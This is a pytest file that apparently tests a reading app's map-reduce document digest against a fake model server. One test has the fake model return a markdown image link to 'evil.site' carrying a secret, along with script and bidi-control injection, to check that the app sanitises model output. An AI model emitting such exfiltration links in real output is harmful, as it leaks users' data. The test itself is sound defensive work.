"""Document digest (AI plan, milestone 1.5): the shape of a document before its detail.

Without a model: the outline, the word count and the reading time, all computed in code.
With one, on request: map-reduce. Each part of the document is summarised on its own (the map step, one call
per part), then the part summaries are combined (the reduce step). The whole text is never sent at once.
It runs in the background with progress, can be stopped, and a stopped digest continues where it stopped.
No test reaches a real server (see conftest)."""
import json
import re
import time

import httpx
import pytest

from readhold.ai import digest, keys
from tests.conftest import SAMPLE_MD
from tests.test_ai import CLOUD, KEY, LOCAL

MAP_MARK = "summarise one part"
REDUCE_MARK = "combine the summaries"


def _doc(client, text=SAMPLE_MD, name=None):
    if name:
        r = client.post("/api/import/file", files={"file": (name, text.encode("utf-8"), "text/plain")})
    else:
        r = client.post("/api/import/text", json={"title": "", "text": text, "format": "markdown"})
    assert r.status_code == 200, r.text
    return r.json()


def _long(sections=8, sentences=18):
    parts = ["# A Long Paper"]
    for i in range(sections):
        body = " ".join(f"In part {i} sentence {j} explains widget {i} and how gear {j} turns it slowly." for j in range(sentences))
        parts.append(f"## Part {i} Title\n\n{body}")
    parts.append("## References\n\n[1] A. Person. Hidden from the digest. 2020.")
    return "\n\n".join(parts)


class Model:
    """A fake model server that answers map and reduce calls from what it was sent."""

    def __init__(self, delay=0.0, map_reply=None, reduce_reply=None, fail_part=None):
        self.requests: list[dict] = []
        self.delay = delay
        self.map_reply = map_reply
        self.reduce_reply = reduce_reply
        self.fail_part = fail_part

    async def __call__(self, request):
        import asyncio

        body = json.loads(request.content)
        self.requests.append(body)
        if self.delay:
            await asyncio.sleep(self.delay)
        system, user = body["messages"][0]["content"], body["messages"][-1]["content"]
        if MAP_MARK in system:
            text = re.search(r"<source [^>]*>\n(.*?)\n</source>", user, re.S).group(1)
            m = re.search(r"Sections: ([^)\n]*)", text)
            first = next(line for line in text.split("\n")[1:] if line and not line.startswith("#"))
            quote = " ".join(first.split()[:9])
            reply = self.map_reply(text) if self.map_reply else {
                "summary": f"This part covers {m.group(1) if m else 'something'}.",
                "points": [{"text": "A point from this part.", "quote": quote}],
                "keywords": ["widget", "unicorn"]}
            if self.fail_part and self.fail_part in text:
                reply = "not json at all"
        else:
            quotes = re.findall(r"quote: “([^”]+)”", user)
            reply = self.reduce_reply(user) if self.reduce_reply else {
                "summary": "The paper explains widgets and gears.",
                "key_ideas": [{"text": "Widgets are turned by gears.", "anchor": "", "quote": q} for q in quotes[:2]]
                + [{"text": "An invented idea.", "anchor": "", "quote": "this sentence is not anywhere in the paper at all"}],
                "keywords": ["widget", "gear", "unicorn"],
                "difficulty": "introductory"}
        content = reply if isinstance(reply, str) else json.dumps(reply)
        return httpx.Response(200, json={"message": {"role": "assistant", "content": content}, "prompt_eval_count": len(user) // 4, "eval_count": 50})

    def kinds(self):
        return ["map" if MAP_MARK in r["messages"][0]["content"] else "reduce" for r in self.requests]


def _model(client, model, settings=LOCAL):
    client.app.state.ai.transport = httpx.MockTransport(model)
    client.app.state.ai.retry_wait = 0
    client.put("/api/settings", json=settings)
    return model


def _wait(client, doc_id, until=("done", "failed", "cancelled"), timeout=20.0):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        got = client.get(f"/api/documents/{doc_id}/digest").json()
        if got["job"] and got["job"]["state"] in until:
            return got
        time.sleep(0.02)
    raise AssertionError(f"the digest did not finish: {got}")


@pytest.fixture()
def small_parts(monkeypatch):
    monkeypatch.setattr(digest, "CHUNK", 2_000)  # small parts, so a short test document has several


# ------------------------------------------------------------------ without a model
def test_the_outline_and_the_reading_time_need_no_model(client):
    doc = _doc(client)
    got = client.get(f"/api/documents/{doc['id']}/digest").json()
    assert got["ai"] == {"mode": "off"} and got["digest"] is None and got["job"] is None
    facts = got["facts"]
    assert [s["title"] for s in facts["outline"]] == ["Abstract", "Introduction", "Related Work", "Method", "Results", "References"]
    assert facts["outline"][-1]["skipped"] is True and not facts["outline"][0]["skipped"]
    assert facts["words"] > 50 and facts["minutes"] == max(1, -(-facts["words"] // 250)) and facts["wpm"] == 250
    assert all(isinstance(s["sentence"], int) for s in facts["outline"])
    assert client.get("/api/documents/nope/digest").status_code == 404


def test_with_ai_off_nothing_is_sent(client):
    doc = _doc(client)
    model = Model()
    client.app.state.ai.transport = httpx.MockTransport(model)
    r = client.post(f"/api/documents/{doc['id']}/digest", json={})
    assert r.status_code == 409 and "off" in r.json()["detail"].lower() and model.requests == []


# ------------------------------------------------------------------ map-reduce
def test_each_part_is_read_on_its_own_and_then_combined(client, small_parts):
    doc = _doc(client, _long())
    model = _model(client, Model())
    r = client.post(f"/api/documents/{doc['id']}/digest", json={})
    assert r.status_code == 200 and r.json()["job"]["state"] in ("running", "done")
    got = _wait(client, doc["id"])
    assert got["job"]["state"] == "done" and got["job"]["done"] == got["job"]["total"]
    kinds = model.kinds()
    assert kinds[-1] == "reduce" and kinds.count("reduce") == 1 and kinds.count("map") == got["job"]["total"] >= 3
    for body in model.requests[:-1]:  # a map call holds one part, never the whole document
        user = body["messages"][-1]["content"]
        assert user.count("<source ") == 1 and len(user) < 2_600 and "Hidden from the digest" not in user
    reduce_user = model.requests[-1]["messages"][-1]["content"]
    assert "sentence 17 explains widget 7" not in reduce_user  # the reduce step reads part summaries, not the text
    assert "This part covers Part 0 Title" in reduce_user
    d = got["digest"]
    assert d["summary"] == "The paper explains widgets and gears." and d["difficulty"] == "introductory"
    assert [x["verified"] for x in d["key_ideas"]] == [True, True, False] and d["status"] == "partly"
    assert all(isinstance(x["sentence"], int) for x in d["key_ideas"] if x["verified"])
    assert "unicorn" not in d["keywords"] and "widget" in d["keywords"]  # a keyword that is not in the document is dropped
    assert len(d["parts"]) == got["job"]["total"] and d["parts"][0]["summary"].startswith("This part covers Part 0")
    assert all(isinstance(p["sentence"], int) for p in d["parts"])
    rows = client.get("/api/ai/log").json()["rows"]
    assert {r["task"] for r in rows} == {"digest", "digest_map"} and all(r["prompt_version"] for r in rows)


def test_a_digest_is_kept_and_ask_again_redoes_only_the_combining(client, small_parts):
    doc = _doc(client, _long(4))
    model = _model(client, Model())
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    first = _wait(client, doc["id"])["digest"]
    sent = len(model.requests)
    again = client.post(f"/api/documents/{doc['id']}/digest", json={}).json()
    assert again["digest"]["id"] == first["id"] and len(model.requests) == sent  # nothing new is asked
    assert client.get(f"/api/documents/{doc['id']}/digest").json()["digest"]["id"] == first["id"]
    client.post(f"/api/documents/{doc['id']}/digest", json={"fresh": True})
    fresh = _wait(client, doc["id"])["digest"]
    assert fresh["id"] != first["id"] and model.kinds()[sent:] == ["reduce"]  # the parts are kept; only the combining is asked again


def test_a_stopped_digest_continues_where_it_stopped(client, small_parts):
    doc = _doc(client, _long(6))
    model = _model(client, Model(delay=0.15))
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    end = time.monotonic() + 10
    while time.monotonic() < end and client.get(f"/api/documents/{doc['id']}/digest").json()["job"]["done"] < 2:
        time.sleep(0.02)
    assert client.post(f"/api/documents/{doc['id']}/digest/cancel").json()["cancelled"] is True
    stopped = _wait(client, doc["id"], until=("cancelled",))
    done_before, total = stopped["job"]["done"], stopped["job"]["total"]
    assert 2 <= done_before < total and stopped["digest"] is None
    asked = len(model.requests)
    model.delay = 0
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    got = _wait(client, doc["id"])
    assert got["job"]["state"] == "done"
    assert len(model.requests) - asked <= total - done_before + 2  # the parts already read are not read again (one may have been cut short)


def test_a_part_the_model_cannot_summarise_is_skipped_not_fatal(client, small_parts):
    doc = _doc(client, _long(4))
    _model(client, Model(fail_part="Part 2 Title"))
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    got = _wait(client, doc["id"])
    assert got["job"]["state"] == "done"
    failed = [p for p in got["digest"]["parts"] if p["failed"]]
    assert len(failed) == 1 and "Part 2 Title" in failed[0]["titles"] and got["digest"]["skipped_parts"] == 1


def test_a_model_that_is_not_running_fails_the_job_with_words(client):
    doc = _doc(client)

    def down(request):
        raise httpx.ConnectError("refused", request=request)

    _model(client, down)
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    got = _wait(client, doc["id"])
    assert got["job"]["state"] == "failed" and "running" in got["job"]["message"] and got["digest"] is None


def test_the_off_switch_stops_a_running_digest(client, small_parts):
    doc = _doc(client, _long(6))
    model = _model(client, Model(delay=0.2))
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    time.sleep(0.1)
    client.put("/api/settings", json={"ai_mode": "off"})
    got = _wait(client, doc["id"], until=("cancelled", "failed"))
    assert got["job"]["state"] == "cancelled" and got["job"]["done"] < got["job"]["total"]
    n = len(model.requests)
    time.sleep(0.4)
    assert len(model.requests) == n  # nothing more is sent


def test_one_job_per_document_at_a_time(client, small_parts):
    doc = _doc(client, _long(4))
    model = _model(client, Model(delay=0.05))
    a = client.post(f"/api/documents/{doc['id']}/digest", json={}).json()["job"]
    b = client.post(f"/api/documents/{doc['id']}/digest", json={}).json()["job"]
    assert a["id"] == b["id"]
    _wait(client, doc["id"])
    assert model.kinds().count("reduce") == 1


# ------------------------------------------------------------------ limits and privacy
def test_parts_grow_for_a_long_document_and_a_very_long_one_is_refused(client, monkeypatch):
    monkeypatch.setattr(digest, "CHUNK", 2_000)
    monkeypatch.setattr(digest, "MAX_CHUNK", 4_000)
    monkeypatch.setattr(digest, "MAX_CHUNKS", 5)
    fits = _doc(client, _long(8))
    parts = digest.chunks(client.app.state.db, fits["id"])
    assert len(parts) <= 5 and all(len(p.text) <= 4_000 + 400 for p in parts)
    too_long = _doc(client, _long(30))
    _model(client, Model())
    r = client.post(f"/api/documents/{too_long['id']}/digest", json={})
    assert r.status_code == 409 and "too long" in r.json()["detail"].lower()


def test_a_file_of_secrets_is_never_sent_to_a_cloud_model(client):
    doc = _doc(client, "db:\n  password: correct-horse-battery\n  user: admin\n", name="secrets.yaml")
    keys.save("anthropic", KEY)
    model = Model()
    client.app.state.ai.transport = httpx.MockTransport(model)
    client.put("/api/settings", json=CLOUD)
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    got = _wait(client, doc["id"])
    assert got["job"]["state"] == "failed" and "never sent" in got["job"]["message"] and model.requests == []


def test_what_the_model_writes_is_cleaned(client):
    doc = _doc(client)
    _model(client, Model(reduce_reply=lambda user: {
        "summary": "See ![x](https://evil.site/?d=SECRET) <script>x</script>‮", "key_ideas": [],
        "keywords": ["[k](https://evil.site/k)"], "difficulty": "advanced"}))
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    d = _wait(client, doc["id"])["digest"]
    flat = json.dumps(d, ensure_ascii=False)
    assert "![" not in flat and "](" not in flat and "‮" not in flat and "https://evil.site/?d=SECRET" in d["links"]
    assert d["key_ideas"] == [] and d["status"] == "unverified"


def test_clear_ai_history_and_removing_the_document_take_the_digest_away(client, db):
    doc = _doc(client)
    _model(client, Model())
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    _wait(client, doc["id"])
    assert db.scalar("SELECT COUNT(*) FROM ai_results WHERE feature IN ('digest', 'digest_map')") >= 2
    client.delete("/api/ai/log")
    assert db.scalar("SELECT COUNT(*) FROM ai_results") == 0 and client.get(f"/api/documents/{doc['id']}/digest").json()["digest"] is None
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    _wait(client, doc["id"])
    client.delete(f"/api/documents/{doc['id']}")
    assert db.scalar("SELECT COUNT(*) FROM ai_results WHERE deleted=0") == 0


# ------------------------------------------------------------------ found by a review
def test_removing_the_document_stops_the_digest_and_nothing_more_is_sent(client, small_parts):
    doc = _doc(client, _long(8))
    model = _model(client, Model(delay=0.15))
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    time.sleep(0.25)
    client.delete(f"/api/documents/{doc['id']}")
    n = len(model.requests)
    time.sleep(0.6)
    assert len(model.requests) <= n + 1  # at most the part already in flight
    assert digest._jobs[doc["id"]].state == "cancelled"


def test_stop_while_combining_keeps_no_digest(client, monkeypatch):
    doc = _doc(client)
    model = _model(client, Model(delay=0.3))
    real = digest.guard.ask

    def ask(*a, **k):
        if a[2] == "digest":  # press Stop just as the combining call goes out
            client.post(f"/api/documents/{doc['id']}/digest/cancel")
        return real(*a, **k)

    monkeypatch.setattr(digest.guard, "ask", ask)
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    got = _wait(client, doc["id"])
    assert got["job"]["state"] == "cancelled" and got["digest"] is None and "reduce" in model.kinds()


def test_the_combining_step_fits_its_budget_with_many_parts(client, small_parts):
    doc = _doc(client, _long(24, 14))
    model = _model(client, Model())
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    got = _wait(client, doc["id"])
    assert got["job"]["total"] >= 20
    reduce = model.requests[-1]["messages"][-1]["content"]
    assert len(reduce) <= digest.guard.BUDGETS["digest"] + 3_000
    checks = json.loads(client.app.state.db.one("SELECT checks FROM ai_log WHERE task='digest' ORDER BY created_at DESC LIMIT 1")["checks"])
    assert checks["trimmed"] is False  # nothing is cut in the middle: whole points are left out instead
    assert all(q.count("“") == q.count("”") for q in reduce.split("\n"))


def test_one_enormous_sentence_is_cut_into_parts(client):
    one_line = "x = [" + ", ".join(f"'item number {i} of a very long list'" for i in range(4000)) + "]\n"
    doc = _doc(client, one_line, name="data.py")
    parts = digest.chunks(client.app.state.db, doc["id"])
    assert len(parts) > 10 and all(len(p.text) <= digest.CHUNK + 50 for p in parts)


def test_many_tiny_sections_keep_a_short_header():
    sections = [(f"Heading number {i} with a fairly long title", [{"ord": i, "text": "Short.", "section_id": str(i)}]) for i in range(400)]
    packed = digest._pack(sections, 6_000)
    assert len(packed) > 1  # the titles themselves count, so they cannot pile up in one part


def test_an_empty_or_hidden_only_document_has_nothing_to_digest(client):
    doc = _doc(client, "# Only references\n\n## References\n\n[1] A. Person. Something. 2020.\n")
    _model(client, Model())
    r = client.post(f"/api/documents/{doc['id']}/digest", json={})
    assert r.status_code == 409 and "no text to digest" in r.json()["detail"]


def test_keywords_are_whole_words_of_the_document(client):
    from readhold.ai.digest import _clean_keywords
    from readhold.ai.guard import _plain

    within = _plain("The router keeps the top-k blocks. Gating networks are cheap.")
    assert _clean_keywords(["e", "ent", "router", "top-k", "gating network", "rout", "blocks"], within, []) == ["router", "top-k", "blocks"]


def test_polling_a_running_digest_does_not_rebuild_the_parts(client, small_parts, monkeypatch):
    doc = _doc(client, _long(6))
    _model(client, Model(delay=0.2))
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    end = time.monotonic() + 5
    while time.monotonic() < end and client.get(f"/api/documents/{doc['id']}/digest").json()["job"]["done"] < 1:
        time.sleep(0.02)  # the job itself has cut the document into parts by now
    calls = []
    real = digest.chunks
    monkeypatch.setattr(digest, "chunks", lambda *a: calls.append(1) or real(*a))
    for _ in range(5):
        client.get(f"/api/documents/{doc['id']}/digest")
    assert calls == []
    _wait(client, doc["id"])
    client.get(f"/api/documents/{doc['id']}/digest")
    client.get(f"/api/documents/{doc['id']}/digest")
    assert len(calls) <= 1  # the key is remembered while the structure stays the same


def test_cancel_of_an_unknown_document_is_404_and_clear_history_stops_a_digest(client, small_parts):
    assert client.post("/api/documents/nope/digest/cancel").status_code == 404
    doc = _doc(client, _long(6))
    _model(client, Model(delay=0.15))
    client.post(f"/api/documents/{doc['id']}/digest", json={})
    time.sleep(0.2)
    client.delete("/api/ai/log")
    got = _wait(client, doc["id"], until=("cancelled",))
    assert got["digest"] is None
